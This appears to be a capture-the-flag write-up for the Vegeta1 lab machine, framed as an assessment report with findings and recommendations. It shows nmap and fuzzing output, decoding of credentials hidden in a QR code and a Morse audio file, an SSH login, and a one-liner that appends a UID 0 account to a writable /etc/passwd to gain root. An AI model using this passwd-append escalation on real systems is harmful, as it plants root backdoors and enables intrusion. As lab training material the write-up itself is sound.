# Vegeta1

Table of Contents:

1. [#summary](vegeta1.md#summary "mention")
2. [#target-details](vegeta1.md#target-details "mention")
3. [#summary-of-findings](vegeta1.md#summary-of-findings "mention")
4. [#enumeration](vegeta1.md#enumeration "mention")
5. [#initial-access](vegeta1.md#initial-access "mention")
6. [#privilege-escalation](vegeta1.md#privilege-escalation "mention")

***

#### **Summary**

During the assessment of `192.168.177.73`Multiple publicly accessible web contents were discovered that contained embedded credential material (audio). Decoding these assets yielded valid credentials for a local user account `trunks`. Using the discovered credentials, an SSH session was established with the host. From that shell, it was possible to create a UID 0 account (by appending an entry to `/etc/passwd`), and escalate to root. The attack chain was as follows: **public web artifacts > credential disclosure > SSH login (trunks) > unauthorized modification of system files > root compromise.**

**Impact**: An attacker with only web access to publicly exposed assets could obtain valid credentials and fully compromise the host due to inadequate protections around web content and improper local file permission controls.

***

#### Target Details

* IP: `192.168.177.73`
* OS: Linux
* Services:
  * `22/tcp` - `ssh` | OpenSSH 7.9p1 (Debian)
  * `80/tcp` - `http` | Apache httpd 2.4.38 (Debian)

***

#### Summary of Findings

**Finding 1 - Sensitive artifacts in public web content (encoded credentials)**

**Severity**: High

**Description**: The site contained base64 encoded content and an audio file. Decoding these items produced a QR code that contained a password and an audio-decodable Morse string that spelled out username/password hints.

**Impact**: An unauthenticated remote user could decode these artifacts and obtain credentials to access the host.

**Recommendation**: Remove or sanitize any embedded secrets from public assets, implement content review policies, and restrict file uploads/uploaded content serving.

**Finding 2 - Credentials discovered and used to obtain SSH access**

**Severity**: High

**Description**: Decoded artifacts yielded valid credentials. SSH access as a user  `trunks` was established.

**Impact**: Remote unauthenticated access to hosts via recovered credentials.

**Recommendation**: Rotate compromised credentials, enforce secure credentials storage, and monitor for suspicious authentication attempts.

**Finding 3 - Inadequate local permissions allowing modification of system-critical files**

**Severity**: Critical

**Description**: From the `trunks` account, it was possible to append a UID 0 entry to `/etc/passwd` enabling creation of a root-equivalent user. This indicates incorrect file permissions or an environmental misconfiguration granting unprivileged write access to critical system files.

**Impact**: Immediate full system compromise and persistent root access.

**Recommendation**: Restrict filesystem write permissions, remove any services or misconfigurations enabling writes, deploy file integrity monitoring, and audit all local file-privilege boundaries.

***

#### Enumeration

**Nmap Scan**

```
nmap -p- --open -sCV -vv vegetaone.offsec -oN nmap_vegetaone.txt
```

**Result**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC99CVoBmDEZGefSkVfvgPRyFNH5rKQF9KMAsqFTL+Xkbwg2S3t+8tIFpPon/m7SYAH+NTqfv3uYXPq2DkVAXD8i2iXKnRa0+QKHNe2bupBbaTX3xyWGHeL7aBh4Io7xxEiTaCLD9wrDA9aHxHhXdUC0QMvld21dIJygyOoV9P17FC3EwBqJEOjLnCNTxzi25W0f6Gqv1vZXHFeQJfT4CLRZCE8BtpBAaoiKMGFOMJEOy+gVe1YgFim/smodNO51fx7zZKxMjhcE46BBRgcywE1FflXPFx3NYDTkou3Wmo0ENEvXcmD36tZsFeMHLyAv/rD2NG1cCWJp6tfcD/SbSPj
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJVCfO2orE34rbwG0NoOp8DNLMEusESLX7L7c45ZjSk7DgSn8edbEuGlswfCdyyROevxZ/aHgMQO8avPFE/ZAME=
|   256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAc1RjhxOyboK+O9fxD5/tbd04IwXVwrQQDT16A111tu
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Fuzz**

```
/admin                (Status: 301) [Size: 320] [--> http://vegetaone.offsec/admin/]
/image                (Status: 301) [Size: 320] [--> http://vegetaone.offsec/image/]
/img                  (Status: 301) [Size: 318] [--> http://vegetaone.offsec/img/]
/index.html           (Status: 200) [Size: 119]
/manual               (Status: 301) [Size: 321] [--> http://vegetaone.offsec/manual/]
/robots.txt           (Status: 200) [Size: 11]
/bulma                (Status: 301) [Size: 320] [--> http://vegetaone.offsec/bulma/]
```

***

Found a directory `find_me` listed in `robots.txt` which leads me to a file named `find_me.html`

Url: `http://vegetaone.offsec/find_me_file.html`

```
aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw==
```

A long base64 string was found. The string was base64 decoded twice and written to `out.png` which contains a QR code.

<pre><code><strong>$ zbarimg out.png 
</strong>QR-Code:Password : topshellv
scanned 1 barcode symbols from 1 images in 0 seconds
</code></pre>

The audio file `hahahaha.wav` was located under `/bulma` which encoded Morse. Used an adaptive Morse audio decoder&#x20;

```
https://morsecode.world/international/decoder/audio-decoder-adaptive.html
```

By uploading the audio and decoding, we receive the username & password.

```
USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)
```

username: `trunks`

password: `u$3r`

***

#### Initial Access

Establishing a connection to the target system through SSH

```
ssh trunks@vegetaone.offsec
```

***

#### Privilege Escalation

In the home directory `/home/trunks`, file `.bash_history` is present.

<figure><img src=".gitbook/assets/Vegeta1 bash_history.png" alt=""><figcaption></figcaption></figure>

We see the user `Tom` Referenced in the bash history, the user does not exist in `/etc/passwd`. We got commands to create the user and escalate privilege  `root` with the password: `Password@973` .

```
trunks@Vegeta:~$ perl -le 'print crypt("Password@973","addedsalt")' && echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ad7t5uIalqMws
trunks@Vegeta:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash
trunks@Vegeta:~$ su Tom
Password: 
root@Vegeta:/home/trunks# cd
root@Vegeta:~# whoami
root
```

Successful privilege escalated to `root`.
